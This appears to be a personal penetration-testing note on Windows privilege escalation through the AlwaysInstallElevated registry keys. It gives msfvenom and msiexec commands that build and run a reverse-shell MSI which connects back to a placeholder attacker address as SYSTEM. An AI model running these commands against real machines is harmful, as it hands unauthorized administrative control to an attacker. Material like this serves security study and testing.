
### Overview
---
``AlwaysInstallElevated`` registry keys guarantee that MSI files always execute as SYSTEM (even if an unprivileged user runs them).

**Key Paths:**
```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### Exploitation Example
---
``Invoke-PrivEscAudit`` from ``PowerUp.ps1`` can output potential exploitation vectors, including ``AlwaysInstallElevated``.

>[!info]
>``PowerUp.ps1`` provides scripts to exploit this, but this example will do it manually.

![[Pasted image 20230306233035.png]]

**Manual Exploitation:**
- Create a reverse shell MSI to execute on the victim.
```shell
# Create Reverse Shell MSI
msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=<listening_port> -f msi > powershell_payload.msi

### Move binary to victim however you want ###
```

```powershell
### On Victim ###
# Execute MSI to establish SYSTEM level reverse shell
msiexec /q /i powershell_payload.msi
```
